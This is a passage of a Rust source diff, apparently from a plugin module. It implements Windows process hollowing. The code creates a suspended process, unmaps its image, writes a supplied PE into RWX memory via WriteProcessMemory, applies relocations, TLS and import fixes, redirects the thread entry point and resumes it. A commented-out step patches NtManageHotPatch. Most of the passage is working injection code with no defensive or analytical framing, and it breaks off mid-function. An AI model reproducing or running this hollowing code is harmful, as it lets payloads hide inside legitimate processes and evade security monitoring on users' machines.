-        let success = unsafe {
-            CreateProcessA(
-                None,
-                Some(PSTR(command_line.as_mut_ptr())),
-                None,
-                None,
-                false,
-                CREATE_SUSPENDED,
-                None,
-                None,
-                &startup_info,
-                &mut process_info,
-            )
-        };
-        if !success.is_ok() {
-            return Err(anyhow::anyhow!("CreateProcessA failed"));
-        }
-        log::info!("Suspended process created. PID: {}", process_info.dwProcessId);
-
-        let h_process = process_info.hProcess;
-        let h_thread = process_info.hThread;
-
-        // 2. Get the PEB address and image base address
-        let mut pbi = PROCESS_BASIC_INFORMATION::default();
-        let status = unsafe {
-            NtQueryInformationProcess(
-                h_process,
-                windows::Wdk::System::Threading::PROCESSINFOCLASS(0),
-                &mut pbi as *mut _ as *mut c_void,
-                std::mem::size_of::<PROCESS_BASIC_INFORMATION>() as u32,
-                std::ptr::null_mut(),
-            )
-        };
-        if !status.is_ok() {
-            return Err(anyhow::anyhow!("NtQueryInformationProcess failed with status: {:?}", status));
-        }
-        log::info!("Remote PEB at: {:?}", pbi.PebBaseAddress);
-
-        let image_base_addr_ptr = (pbi.PebBaseAddress as usize + 0x10) as *mut c_void;
-        let mut remote_image_base_buf = [0u8; std::mem::size_of::<usize>()];
-        unsafe {
-            ReadProcessMemory(
-                h_process,
-                image_base_addr_ptr,
-                remote_image_base_buf.as_mut_ptr() as *mut c_void,
-                remote_image_base_buf.len(),
-                None,
-            )?
-        };
-        let remote_image_base = usize::from_le_bytes(remote_image_base_buf);
-        log::info!("Original image base: 0x{:X}", remote_image_base);
-
-        // 3. Unmap the original executable
-        let status = unsafe { NtUnmapViewOfSection(h_process, Some(remote_image_base as *mut c_void)) };
-        if status.is_err() {
-            log::warn!("NtUnmapViewOfSection returned non-success status: {:?}. This might be okay.", status);
-        } else {
-            log::info!("NtUnmapViewOfSection succeeded.");
-        }
-
-        // 4. Parse PE headers using goblin
-        let pe = goblin::pe::PE::parse(pe_data)?;
-        let opt = pe.header.optional_header.ok_or_else(|| anyhow::anyhow!("Missing optional header"))?;
-        let dos_header = unsafe { &*(pe_data.as_ptr() as *const IMAGE_DOS_HEADER) };
-        let nt_headers_ptr = (pe_data.as_ptr() as usize + dos_header.e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;
-        let optional_header = unsafe { &mut (*nt_headers_ptr).OptionalHeader };
-        let file_header = unsafe { &(*nt_headers_ptr).FileHeader };
-        let image_base = opt.windows_fields.image_base as usize;
-        let entry_rva = opt.standard_fields.address_of_entry_point;
-        let size_of_image = opt.windows_fields.size_of_image as usize;
-        let size_of_headers = opt.windows_fields.size_of_headers as usize;
-        log::info!("Source PE parsed: Size=0x{:X}, EntryRVA=0x{:X}, PreferredBase=0x{:X}", size_of_image, entry_rva, image_base);
-
-        // 5. Allocate memory for the new image
-        let new_base = unsafe {
-            VirtualAllocEx(
-                h_process,
-                None,
-                size_of_image,
-                MEM_COMMIT | MEM_RESERVE,
-                PAGE_EXECUTE_READWRITE,
-            )
-        } as usize;
-        if new_base == 0 {
-            return Err(anyhow::anyhow!("VirtualAllocEx failed: {}", std::io::Error::last_os_error()));
-        }
-        log::info!("New image allocated at: 0x{:X}", new_base);
-
-        // 6. Patch image base in local headers before writing
-        optional_header.ImageBase = new_base as u64;
-
-        // 7. Write PE headers
-        let write_headers = unsafe {
-            WriteProcessMemory(
-                h_process,
-                new_base as *mut c_void,
-                pe_data.as_ptr() as *const c_void,
-                size_of_headers,
-                None,
-            )
-        };
-        if !write_headers.is_ok() {
-            return Err(anyhow::anyhow!("WriteProcessMemory (headers) failed"));
-        }
-        log::info!("Headers written at: 0x{:X}", new_base);
-
-        // 8. Write sections
-        let sections_ptr = (nt_headers_ptr as usize + std::mem::size_of::<IMAGE_NT_HEADERS64>()) as *const IMAGE_SECTION_HEADER;
-        let sections = unsafe { std::slice::from_raw_parts(sections_ptr, file_header.NumberOfSections as usize) };
-        for section in sections {
-            let dest = (new_base + section.VirtualAddress as usize) as *mut c_void;
-            let src_offset = section.PointerToRawData as usize;
-            let raw_size = section.SizeOfRawData as usize;
-            if raw_size == 0 {
-                continue;
-            }
-            if src_offset + raw_size > pe_data.len() {
-                log::warn!("Section {} out of bounds, skipping", String::from_utf8_lossy(&section.Name));
-                continue;
-            }
-            let src = pe_data.as_ptr().wrapping_add(src_offset) as *const c_void;
-            let write_section = unsafe {
-                WriteProcessMemory(
-                    h_process,
-                    dest,
-                    src,
-                    raw_size,
-                    None,
-                )
-            };
-            if !write_section.is_ok() {
-                log::warn!("WriteProcessMemory failed for section {}", String::from_utf8_lossy(&section.Name));
-            } else {
-                log::info!("Section {} written at: 0x{:X}", String::from_utf8_lossy(&section.Name), dest as usize);
-            }
-        }
-
-        // 9. Update PEB image base
+        // 8. Update PEB image base
         let new_base_bytes = new_base.to_le_bytes();
         unsafe {
             WriteProcessMemory(
@@ -903,72 +182,211 @@ impl PluginApp {
         };
         log::info!("Remote PEB image base updated to 0x{:X}", new_base);
 
-        // 10. Apply relocations if needed
+        // 9. Apply relocations if needed
         if new_base != image_base {
-            let delta = new_base.wrapping_sub(image_base);
-            log::info!("Applying relocations (delta: 0x{:X})...", delta);
-            Self::apply_relocations(pe_data, h_process, new_base, image_base)?;
-        } else {
-            log::info!("No relocations needed.");
+            log::info!("Applying relocations (delta: 0x{:X})...", new_base.wrapping_sub(image_base));
+            if let Err(e) = apply_relocations(pe_data, h_process, new_base, image_base) {
+                log::error!("Relocations failed: {:?}", e);
+                return Err(e);
+            }
+        }
+
+        // 10. Patch TLS directory if present
+        let tls_dir_opt = opt.data_directories.get_tls_table();
+        if let Some(tls_dir) = tls_dir_opt {
+            if tls_dir.virtual_address != 0 && tls_dir.size >= 24 {
+                log::info!("Patching TLS directory at RVA 0x{:X}", tls_dir.virtual_address);
+                let tls_va = tls_dir.virtual_address as usize;
+                let tls_rva_offset = rva_to_offset(pe_data, tls_va).unwrap_or(0);
+                    #[repr(C)]
+                    #[derive(Copy, Clone, Debug)]
+                    struct ImageTlsDirectory64 {
+                        start_address_of_raw_data: u64,
+                        end_address_of_raw_data: u64,
+                        address_of_index: u64,
+                        address_of_callbacks: u64,
+                        size_of_zero_fill: u32,
+                        characteristics: u32,
+                    }
+
+                if tls_rva_offset > 0 && tls_rva_offset + std::mem::size_of::<ImageTlsDirectory64>() <= pe_data.len() {
+
+
+                    let tls_dir_struct: &ImageTlsDirectory64 = unsafe { &*(pe_data.as_ptr().add(tls_rva_offset) as *const ImageTlsDirectory64) };
+                    let mut patched_tls = *tls_dir_struct;
+                    let delta = new_base.wrapping_sub(image_base);
+
+                    let patch_field = |field: u64| {
+                        if field != 0 {
+                            let new_field = field.wrapping_add(delta as u64);
+                            log::debug!("TLS field 0x{:X} patched to 0x{:X}", field, new_field);
+                            new_field
+                        } else {
+                            0
+                        }
+                    };
+
+                    patched_tls.start_address_of_raw_data = patch_field(tls_dir_struct.start_address_of_raw_data);
+                    patched_tls.end_address_of_raw_data = patch_field(tls_dir_struct.end_address_of_raw_data);
+                    patched_tls.address_of_index = patch_field(tls_dir_struct.address_of_index);
+                    patched_tls.address_of_callbacks = patch_field(tls_dir_struct.address_of_callbacks);
+
+                    let remote_tls_addr = (new_base + tls_va) as *mut c_void;
+                    if unsafe {
+                        WriteProcessMemory(
+                            h_process,
+                            remote_tls_addr,
+                            &patched_tls as *const _ as *const c_void,
+                            std::mem::size_of::<ImageTlsDirectory64>(),
+                            None,
+                        )
+                    }
+                    .is_ok()
+                    {
+                        log::info!("TLS directory patched successfully at 0x{:X}", remote_tls_addr as usize);
+                    } else {
+                        log::warn!("Failed to write patched TLS directory to remote process.");
+                    }
+
+                    // Log TLS callbacks for debugging
+                    if patched_tls.address_of_callbacks != 0 {
+                        let mut callback_addr = patched_tls.address_of_callbacks;
+                        let mut index = 0;
+                        loop {
+                            let mut callback: u64 = 0;
+                            if unsafe {
+                                ReadProcessMemory(
+                                    h_process,
+                                    callback_addr as *const c_void,
+                                    &mut callback as *mut _ as *mut c_void,
+                                    std::mem::size_of::<u64>(),
+                                    None,
+                                )
+                            }
+                            .is_ok()
+                            {
+                                if callback == 0 {
+                                    break;
+                                }
+                                log::debug!("TLS callback {} at 0x{:X}", index, callback);
+                                callback_addr += std::mem::size_of::<u64>() as u64;
+                                index += 1;
+                            } else {
+                                log::warn!("Failed to read TLS callback at 0x{:X}", callback_addr);
+                                break;
+                            }
+                        }
+                    }
+                } else {
+                    log::warn!("TLS directory offset out of bounds, skipping patch.");
+                }
+            }
         }
 
         // 11. Resolve imports
         log::info!("Resolving imports...");
-        Self::resolve_imports(pe_data, h_process, new_base as *mut c_void)?;
-
-
-        // 12. Set memory protection for the whole image (for reliability)
-        let mut old_protect  = PAGE_PROTECTION_FLAGS(0);
-        let protect_res = unsafe {
-            VirtualProtectEx(
-                h_process,
-                new_base as *mut c_void,
-                size_of_image,
-                PAGE_EXECUTE_READWRITE,
-                &mut old_protect,
-            )
-        };
-
-        if let Err(e) = protect_res {
-            log::error!("VirtualProtectEx failed for image: {e:?}");
+        if let Some(import_dir) = opt.data_directories.get_import_table() {
+            if import_dir.virtual_address != 0 && import_dir.size != 0 {
+                if let Err(e) = resolve_imports(pe_data, h_process, new_base as *mut c_void) {
+                    log::error!("Import resolution failed: {:?}", e);
+                    return Err(e);
+                }
+            } else {
+                log::info!("No import table found in PE.");
+            }
         } else {
-            log::info!("VirtualProtectEx succeeded for image");
+            log::info!("No import directory found in PE.");
         }
 
-        // 12b. Patch NtManageHotPatch in remote process for Win11 24H2+ compatibility
-        if let Err(e) = Self::patch_nt_manage_hotpatch64(h_process) {
-            log::error!("patch_nt_manage_hotpatch64 failed: {e}");
-            let err = unsafe { windows::Win32::Foundation::GetLastError() };
-            log::error!("Win32 Error: {}", err.to_hresult().message());
-        } else {
-            log::info!("NtManageHotPatch64 patched successfully");
-        }
+        // 12. Patch NtManageHotPatch for Windows 11 24H2+ compatibility
+        // if let Err(e) = patch_nt_manage_hotpatch64(h_process) {
+        //     let x = unsafe { GetLastError().to_hresult().message() };
+        //     log::warn!("patch_nt_manage_hotpatch64 failed: {:?} {:?}", e, x);
+        // } else {
+        //     log::info!("NtManageHotPatch64 patched successfully");
+        //     log::info!("NtManageHotPatch64 Win32: {}", unsafe { GetLastError().to_hresult().message() });
+        // }
 
-        // 13. Set thread context to new entry point
+        // 13. Set final section protections
+        log::info!("Setting final section protections...");
+        for section in pe.sections.iter() {
+            let dest = (new_base + section.virtual_address as usize) as *mut c_void;
+            let size = std::cmp::max(section.virtual_size, section.size_of_raw_data) as usize;
+            let characteristics = section.characteristics;
+            if size > 0 {
+                let protection = if characteristics & 0x20000000 != 0 { // EXECUTE
+                    if characteristics & 0x40000000 != 0 { // READ
+                        if characteristics & 0x80000000 != 0 {
+                            PAGE_EXECUTE_READWRITE // Allow writes if needed
+                        } else {
+                            PAGE_EXECUTE_READ
+                        }
+                    } else {
+                        PAGE_EXECUTE_READ
+                    }
+                } else if characteristics & 0x80000000 != 0 { // WRITE
+                    PAGE_READWRITE
+                } else if characteristics & 0x40000000 != 0 { // READ
+                    PAGE_READONLY
+                } else {
+                    PAGE_NOACCESS
+                };
+                let mut old_protect = PAGE_PROTECTION_FLAGS(0);
+                if let Err(e) = unsafe { VirtualProtectEx(h_process, dest, size, protection, &mut old_protect) } {
+                    log::warn!(
+                        "Failed to set final protection for section {}: {:?}",
+                        String::from_utf8_lossy(section.name().unwrap_or_default().as_bytes()),
+                        e
+                    );
+                } else {
+                    log::info!("VirtualProtectEx Win32: {}", unsafe { GetLastError().to_hresult().message() });
+                    log::warn!(
+                        "Set protection for section {} to 0x{:X} at 0x{:X} (size: 0x{:X})",
+                        String::from_utf8_lossy(section.name().unwrap_or_default().as_bytes()),
+                        protection.0,
+                        dest as usize,
+                        size
+                    );
+                }
+            }
+        }
+        // Set PE header to READONLY
+        let mut old_protect_header = PAGE_PROTECTION_FLAGS(0);
+        if let Err(e) = unsafe { VirtualProtectEx(h_process, new_base as *mut c_void, size_of_headers, PAGE_READONLY, &mut old_protect_header) } {
+            log::warn!("Failed to set final protection for PE header: {:?}", e);
+        }
+        // unsafe { FlushInstructionCache(h_process, None, 0)? };
+        // log::info!("Final protections set and instruction cache flushed.");
+        
+        // 14. Set thread context to new entry point
         let mut context = CONTEXT::default();
         context.ContextFlags = CONTEXT_ALL_AMD64;
-        let get_ctx = unsafe { GetThreadContext(h_thread, &mut context) };
-        if let Err(e) = get_ctx {
-            return Err(anyhow::anyhow!("GetThreadContext failed: {e:?}"));
-        }
+        log::info!("FlushInstructionCache Win32: {}", unsafe { GetLastError().to_hresult().message() });
+        unsafe { GetThreadContext(h_thread, &mut context)? };
+        log::error!("GetThreadContext Win32: {}", unsafe { windows::Win32::Foundation::GetLastError().to_hresult().message() });
         #[cfg(target_arch = "x86_64")]
         {
+            context.Rsp = (context.Rsp & !0xF) - 8; // Align stack to 16 bytes
             context.Rip = new_base as u64 + entry_rva as u64;
         }
         #[cfg(target_arch = "x86")]
         {
             context.Eip = (new_base as u32).wrapping_add(entry_rva);
         }
-        log::info!("Setting thread entry point to 0x{:X}", new_base as u64 + entry_rva as u64);
+        log::info!("Setting thread entry point to 0x{:X}, RSP: 0x{:X}", new_base as u64 + entry_rva as u64, context.Rsp);
         let set_ctx = unsafe { SetThreadContext(h_thread, &context) };
         if let Err(e) = set_ctx {
+            let err = unsafe { windows::Win32::Foundation::GetLastError() };
+            log::error!("Win32 Error: {}", err.to_hresult().message());
             return Err(anyhow::anyhow!("SetThreadContext failed: {e:?}"));
         }
 
-        // 14. Resume thread
+        // 15. Resume thread
         log::info!("Resuming main thread...");
         let resume_count = unsafe { ResumeThread(h_thread) };
         if resume_count == u32::MAX {
+            let err = unsafe { windows::Win32::Foundation::GetLastError() };
+            log::error!("Win32 Error: {}", err.to_hresult().message());
             return Err(anyhow::anyhow!("ResumeThread failed"));
         }
         log::info!("ResumeThread returned: {}", resume_count);
@@ -976,12 +394,223 @@ impl PluginApp {
         log::info!("Hollowing complete. New process PID: {}", process_info.dwProcessId);
 
         // Clean up handles
-        unsafe { CloseHandle(h_thread) }?;
-        unsafe { CloseHandle(h_process) }?;
+        unsafe { CloseHandle(h_thread)? };
+        unsafe { CloseHandle(h_process)? };
 
         Ok(process_info.dwProcessId)
     }
 
+        /// Classic process hollowing for EXEs (not DLLs)
+        /// - Creates a suspended process for `target_exe`
+        /// - Unmaps the original image
+        /// - Maps the provided PE buffer as the new image
+        /// - Sets thread context to new entry point
+        /// - Resumes the main thread
+    pub unsafe fn hollow_process_with_exe_original(pe_data: &[u8], target_exe: &str) -> anyhow::Result<u32, anyhow::Error> {
+        use windows::Win32::System::Threading::*;
+        use windows::Win32::System::Diagnostics::Debug::*;
+        use windows::Win32::System::Memory::*;
+        use windows::Wdk::System::Threading::PROCESSINFOCLASS;
+        use windows::Wdk::System::Threading::NtQueryInformationProcess;
+        use windows::Wdk::System::Memory::NtUnmapViewOfSection;
+        use std::ffi::c_void;
+
+        log::warn!("[hollow] Starting hollow_process_with_exe for target: {}", target_exe);
+
+        // 1. Create suspended process
+        let mut startup_info = STARTUPINFOA::default();
+        let mut process_info = PROCESS_INFORMATION::default();
+        let mut command_line = format!("{}\0", target_exe);
+        let create_res = unsafe {
+            CreateProcessA(
+                None,
+                Some(PSTR(command_line.as_mut_ptr())),
+                None,
+                None,
+                BOOL(0).into(),
+                CREATE_SUSPENDED,
+                None,
+                None,
+                &mut startup_info,
+                &mut process_info,
+            )
+        };
+        if let Err(e) = create_res {
+            log::warn!("[hollow][error] CreateProcessA failed: {}", e);
+            return Err(anyhow::anyhow!("CreateProcessA failed: {}", e));
+        }
+        log::warn!("[hollow] Suspended process created. PID: {}", process_info.dwProcessId);
+
+        let h_process = process_info.hProcess;
+        let h_thread = process_info.hThread;
+
+        // 2. Get remote PEB base address
+        let mut peb_addr_buf = [0u8; 8];
+        let peb_base_addr = {
+            let mut pbi = PROCESS_BASIC_INFORMATION::default();
+            let mut ret_len = 0u32;
+            let status = unsafe {
+                NtQueryInformationProcess(
+                    h_process,
+                    PROCESSINFOCLASS(0),
+                    &mut pbi as *mut _ as *mut c_void,
+                    std::mem::size_of::<PROCESS_BASIC_INFORMATION>() as u32,
+                    &mut ret_len,
+                )
+            };
+            if status != windows::Win32::Foundation::NTSTATUS(0) {
+                log::warn!("[hollow][error] NtQueryInformationProcess failed: status=0x{:X}", status.0);
+                return Err(anyhow::anyhow!("NtQueryInformationProcess failed: status=0x{:X}", status.0));
+            }
+            log::warn!("[hollow] PebBaseAddress: 0x{:X}", pbi.PebBaseAddress as usize);
+            pbi.PebBaseAddress as usize
+        };
+        let image_base_addr_ptr = (peb_base_addr + 0x10) as *mut c_void;
+        let read_res = unsafe {
+            ReadProcessMemory(h_process, image_base_addr_ptr, peb_addr_buf.as_mut_ptr() as _, 8, None)
+        };
+        if let Err(e) = read_res {
+            log::warn!("[hollow][error] ReadProcessMemory (PEB image base) failed: {}", e);
+            return Err(anyhow::anyhow!("ReadProcessMemory (PEB image base) failed: {}", e));
+        }
+        let remote_image_base = usize::from_le_bytes(peb_addr_buf);
+        log::warn!("[hollow] Remote image base: 0x{:X}", remote_image_base);
+
+        // 3. Unmap original image
+        let unmap_status = unsafe { NtUnmapViewOfSection(h_process, Some(remote_image_base as *mut c_void)) };
+        log::warn!("[hollow] NtUnmapViewOfSection status: 0x{:X}", unmap_status.0);
+
+        // 4. Parse new EXE headers
+        if pe_data.len() < 0x100 {
+            log::warn!("[hollow][error] PE buffer too small");
+            return Err(anyhow::anyhow!("PE buffer too small"));
+        }
+        let e_lfanew = u32::from_le_bytes(pe_data[0x3C..0x40].try_into().unwrap()) as usize;
+        let nt_headers = &pe_data[e_lfanew..];
+        let size_of_image = u32::from_le_bytes(nt_headers[0x50..0x54].try_into().unwrap()) as usize;
+        let entry_rva = u32::from_le_bytes(nt_headers[0x18 + 0x10..0x18 + 0x14].try_into().unwrap()) as usize;
+        let image_base = u64::from_le_bytes(nt_headers[0x18..0x20].try_into().unwrap()) as usize;
+        log::warn!("[hollow] Parsed PE: image_base=0x{:X}, size_of_image=0x{:X}, entry_rva=0x{:X}", image_base, size_of_image, entry_rva);
+
+        // 5. Allocate memory for new image
+        let alloc = unsafe {
+            VirtualAllocEx(
+                h_process,
+                Some(image_base as *mut _),
+                size_of_image,
+                MEM_COMMIT | MEM_RESERVE,
+                PAGE_EXECUTE_READWRITE,
+            )
+        };
+        let new_base = if alloc.is_null() {
+            log::warn!("[hollow][warn] Preferred base allocation failed, trying fallback...");
+            let fallback = unsafe {
+                VirtualAllocEx(
+                    h_process,
+                    None,
+                    size_of_image,
+                    MEM_COMMIT | MEM_RESERVE,
+                    PAGE_EXECUTE_READWRITE,
+                )
+            };
+            if fallback.is_null() {
+                log::warn!("[hollow][error] VirtualAllocEx for new image failed");
+                return Err(anyhow::anyhow!("VirtualAllocEx for new image failed"));
+            }
+            fallback as usize
+        } else {
+            alloc as usize
+        };
+        log::warn!("[hollow] New image base: 0x{:X}", new_base);
+
+        // 6. Write headers
+        let size_of_headers = u32::from_le_bytes(nt_headers[0x54..0x58].try_into().unwrap()) as usize;
+        let write_headers_res = unsafe {
+            WriteProcessMemory(h_process, new_base as *mut c_void, pe_data.as_ptr() as _, size_of_headers, None)
+        };
+        if let Err(e) = write_headers_res {
+            log::warn!("[hollow][error] WriteProcessMemory (headers) failed: {}", e);
+            return Err(anyhow::anyhow!("WriteProcessMemory (headers) failed: {}", e));
+        }
+        log::warn!("[hollow] Wrote headers (size: 0x{:X})", size_of_headers);
+
+        // 7. Write sections
+        let num_sections = u16::from_le_bytes(nt_headers[6..8].try_into().unwrap()) as usize;
+        let section_table = e_lfanew + 0x18 + u16::from_le_bytes(nt_headers[20..22].try_into().unwrap()) as usize;
+        for i in 0..num_sections {
+            let sec_off = section_table + i * 40;
+            let virt_addr = u32::from_le_bytes(pe_data[sec_off + 12..sec_off + 16].try_into().unwrap()) as usize;
+            let raw_size = u32::from_le_bytes(pe_data[sec_off + 16..sec_off + 20].try_into().unwrap()) as usize;
+            let raw_ptr = u32::from_le_bytes(pe_data[sec_off + 20..sec_off + 24].try_into().unwrap()) as usize;
+            if raw_size == 0 || raw_ptr == 0 { continue; }
+            let write_sec_res = unsafe {
+                WriteProcessMemory(
+                    h_process,
+                    (new_base + virt_addr) as *mut c_void,
+                    pe_data[raw_ptr..raw_ptr + raw_size].as_ptr() as _,
+                    raw_size,
+                    None,
+                )
+            };
+            if let Err(e) = write_sec_res {
+                log::warn!("[hollow][error] WriteProcessMemory (section {}) failed: {}", i, e);
+                return Err(anyhow::anyhow!("WriteProcessMemory (section {}) failed: {}", i, e));
+            }
+            log::warn!("[hollow] Wrote section {}: VA=0x{:X}, size=0x{:X}", i, virt_addr, raw_size);
+        }
+
+        // 8. Update remote PEB image base if needed
+        if new_base != remote_image_base {
+            let new_base_bytes = new_base.to_le_bytes();
+            let update_peb_res = unsafe {
+                WriteProcessMemory(h_process, image_base_addr_ptr, new_base_bytes.as_ptr() as *const c_void, 8, None)
+            };
+            if let Err(e) = update_peb_res {
+                log::warn!("[hollow][error] WriteProcessMemory (PEB update) failed: {}", e);
+                return Err(anyhow::anyhow!("WriteProcessMemory (PEB update) failed: {}", e));
+            }
+            log::warn!("[hollow] Updated PEB image base to 0x{:X}", new_base);
+        }
+
+        // 9. Set thread context to new entry point
+        let mut context = CONTEXT::default();
+        #[cfg(target_arch = "x86_64")]
+        {
+            context.ContextFlags = CONTEXT_ALL_AMD64;
+        }
+        #[cfg(target_arch = "x86")]
+        {
+            context.ContextFlags = CONTEXT_ALL_X86;
+        }
+        let get_ctx_res = unsafe { GetThreadContext(h_thread, &mut context) };
+        if let Err(e) = get_ctx_res {
+            log::warn!("[hollow][error] GetThreadContext failed: {}", e);
+            return Err(anyhow::anyhow!("GetThreadContext failed: {}", e));
+        }
+        #[cfg(target_arch = "x86_64")]
+        {
+            context.Rip = (new_base + entry_rva) as u64;
+            log::warn!("[hollow] Set CONTEXT.Rip = 0x{:X}", context.Rip);
+        }
+        #[cfg(target_arch = "x86")]
+        {
+            context.Eip = (new_base + entry_rva) as u32;
+            log::warn!("[hollow] Set CONTEXT.Eip = 0x{:X}", context.Eip);
+        }
+        let set_ctx_res = unsafe { SetThreadContext(h_thread, &context) };
+        if let Err(e) = set_ctx_res {
+            log::warn!("[hollow][error] SetThreadContext failed: {}", e);
+            return Err(anyhow::anyhow!("SetThreadContext failed: {}", e));
+        }
+
+        // 10. Resume main thread
+        let resume_res = unsafe { ResumeThread(h_thread) };
+        log::warn!("[hollow] ResumeThread returned: {}", resume_res);
+
+        log::warn!("[hollow] Hollowing complete. New process PID: {}", process_info.dwProcessId);
+        Ok(process_info.dwProcessId)
+    }
+    
         // Improved process hollowing with proper relocations and IAT
     pub unsafe fn inject_hollowed_process_improved(
         dll_data: &[u8],
@@ -1449,4 +1078,387 @@ impl PluginApp {
         Ok(())
     }
 
+}
+
+
+pub fn apply_relocations(pe_data: &[u8], process_handle: HANDLE, new_base: usize, preferred_base: usize) -> anyhow::Result<()> {
+    use goblin::pe::PE;
+    let pe = PE::parse(pe_data)?;
+    let delta = new_base.wrapping_sub(preferred_base);
+    if delta == 0 {
+        log::info!("No relocations needed (delta = 0)");
+        return Ok(());
+    }
+    let reloc_dir = pe
+        .header
+        .optional_header
+        .as_ref()
+        .and_then(|opt| opt.data_directories.get_base_relocation_table())
+        .ok_or_else(|| anyhow::anyhow!("No relocation directory found"))?;
+    if reloc_dir.virtual_address == 0 || reloc_dir.size == 0 {
+        log::info!("No relocation table found in PE.");
+        return Ok(());
+    }
+    let mut offset = rva_to_offset(pe_data, reloc_dir.virtual_address as usize).unwrap();
+    let end = offset + reloc_dir.size as usize;
+    let image_size = pe
+        .header
+        .optional_header
+        .map(|opt| opt.windows_fields.size_of_image as usize)
+        .unwrap_or(0);
+    while offset < end {
+        let page_rva = u32::from_le_bytes(pe_data[offset..offset + 4].try_into()?);
+        let block_size = u32::from_le_bytes(pe_data[offset + 4..offset + 8].try_into()?);
+        if block_size == 0 {
+            break;
+        }
+        let entries_count = (block_size as usize - 8) / 2;
+        log::debug!("Reloc block: page_rva=0x{:X}, block_size=0x{:X}, entries={}", page_rva, block_size, entries_count);
+        for i in 0..entries_count {
+            let entry_offset = offset + 8 + i * 2;
+            let entry = u16::from_le_bytes(pe_data[entry_offset..entry_offset + 2].try_into()?);
+            let reloc_type = entry >> 12;
+            let offset_in_page = entry & 0xFFF;
+            let reloc_addr = new_base + page_rva as usize + offset_in_page as usize;
+            let in_bounds = reloc_addr >= new_base && reloc_addr + 8 <= new_base + image_size;
+            log::debug!(
+                "Reloc entry {}: type={}, offset_in_page=0x{:X}, reloc_addr=0x{:X}, in_bounds={}",
+                i,
+                reloc_type,
+                offset_in_page,
+                reloc_addr,
+                in_bounds
+            );
+            if !in_bounds {
+                log::warn!(
+                    "Skipping relocation: address 0x{:X} out of bounds (image base=0x{:X}, size=0x{:X})",
+                    reloc_addr,
+                    new_base,
+                    image_size
+                );
+                continue;
+            }
+            match reloc_type {
+                3 => {
+                    // IMAGE_REL_BASED_HIGHLOW (32-bit)
+                    let mut original_value = 0u32;
+                    let read_res = unsafe {
+                        ReadProcessMemory(
+                            process_handle,
+                            reloc_addr as *const _,
+                            &mut original_value as *mut _ as *mut c_void,
+                            4,
+                            None,
+                        )
+                    };
+                    log::debug!(
+                        "ReadProcessMemory (HIGHLOW): addr=0x{:X}, value=0x{:X}, result={:?}",
+                        reloc_addr,
+                        original_value,
+                        read_res.is_ok()
+                    );
+                    if let Err(e) = read_res {
+                        log::warn!("ReadProcessMemory failed: {:?}", e);
+                        return Err(e.into());
+                    }
+                    let new_value = original_value.wrapping_add(delta as u32);
+                    let write_res = unsafe {
+                        WriteProcessMemory(
+                            process_handle,
+                            reloc_addr as *mut _,
+                            &new_value as *const _ as *const c_void,
+                            4,
+                            None,
+                        )
+                    };
+                    log::debug!(
+                        "WriteProcessMemory (HIGHLOW): addr=0x{:X}, new_value=0x{:X}, result={:?}",
+                        reloc_addr,
+                        new_value,
+                        write_res.is_ok()
+                    );
+                    if let Err(e) = write_res {
+                        log::warn!("WriteProcessMemory failed: {:?}", e);
+                        return Err(e.into());
+                    }
+                }
+                10 => {
+                    // IMAGE_REL_BASED_DIR64 (64-bit)
+                    let mut original_value = 0u64;
+                    let read_res = unsafe {
+                        ReadProcessMemory(
+                            process_handle,
+                            reloc_addr as *const _,
+                            &mut original_value as *mut _ as *mut c_void,
+                            8,
+                            None,
+                        )
+                    };
+                    log::debug!(
+                        "ReadProcessMemory (DIR64): addr=0x{:X}, value=0x{:X}, result={:?}",
+                        reloc_addr,
+                        original_value,
+                        read_res.is_ok()
+                    );
+                    if let Err(e) = read_res {
+                        log::warn!("ReadProcessMemory failed: {:?}", e);
+                        return Err(e.into());
+                    }
+                    let new_value = original_value.wrapping_add(delta as u64);
+                    let write_res = unsafe {
+                        WriteProcessMemory(
+                            process_handle,
+                            reloc_addr as *mut _,
+                            &new_value as *const _ as *const c_void,
+                            8,
+                            None,
+                        )
+                    };
+                    log::debug!(
+                        "WriteProcessMemory (DIR64): addr=0x{:X}, new_value=0x{:X}, result={:?}",
+                        reloc_addr,
+                        new_value,
+                        write_res.is_ok()
+                    );
+                    if let Err(e) = write_res {
+                        log::warn!("WriteProcessMemory failed: {:?}", e);
+                        return Err(e.into());
+                    }
+                }
+                0 => {} // IMAGE_REL_BASED_ABSOLUTE (skip)
+                _ => log::warn!("Unhandled relocation type: {}", reloc_type),
+            }
+        }
+        offset += block_size as usize;
+    }
+    log::info!("Relocations applied successfully.");
+    Ok(())
+}
+
+pub fn resolve_imports(dll_data: &[u8], process_handle: HANDLE, base_addr: *mut c_void) -> anyhow::Result<(), anyhow::Error> {
+    use goblin::pe::PE;
+    let pe = PE::parse(dll_data)?;
+    let image_size = pe
+        .header
+        .optional_header
+        .map(|opt| opt.windows_fields.size_of_image as usize)
+        .unwrap_or(0);
+    for import in &pe.imports {
+        let dll_name = import.dll;
+        log::debug!("Loading DLL: {}", dll_name);
+        let h_module = unsafe {
+            let dll_name_cstr = format!("{}\0", dll_name);
+            let h_module = GetModuleHandleA(PCSTR(dll_name_cstr.as_ptr()));
+            if h_module.is_ok() {
+                h_module
+            } else {
+                log::debug!("DLL {} not loaded, attempting to load", dll_name);
+                LoadLibraryA(PCSTR(dll_name_cstr.as_ptr()))
+            }
+        };
+        let h_module = match h_module {
+            Ok(module) => module,
+            Err(e) => {
+                log::error!("Failed to load DLL {}: {:?}", dll_name, e);
+                return Err(anyhow::anyhow!("Failed to load DLL {}: {:?}", dll_name, e));
+            }
+        };
+        let iat_addr = (base_addr as usize + import.rva as usize) as *mut u64;
+        // Verify IAT address is within image bounds
+        if iat_addr as usize >= base_addr as usize && iat_addr as usize + 8 <= (base_addr as usize + image_size) {
+            let func_addr = unsafe {
+                if !import.name.is_empty() {
+                    let func_name = format!("{}\0", import.name);
+                    log::debug!("Resolving function {} from {}", import.name, dll_name);
+                    let result = GetProcAddress(h_module, PCSTR(func_name.as_ptr()));
+                    if result.is_none() {
+                        let err = GetLastError();
+                        log::warn!("Failed to resolve function {} from {}: {:?}", import.name, dll_name, err);
+                    }
+                    result
+                } else {
+                    log::debug!("Resolving ordinal {} from {}", import.ordinal, dll_name);
+                    let result = GetProcAddress(h_module, PCSTR(import.ordinal as usize as *const u8));
+                    if result.is_none() {
+                        let err = GetLastError();
+                        log::warn!("Failed to resolve ordinal {} from {}: {:?}", import.ordinal, dll_name, err);
+                    }
+                    result
+                }
+            };
+            if let Some(addr) = func_addr {
+                log::debug!("Resolved function at 0x{:X} for IAT 0x{:X}", addr as usize, iat_addr as usize);
+                let write_result = unsafe {
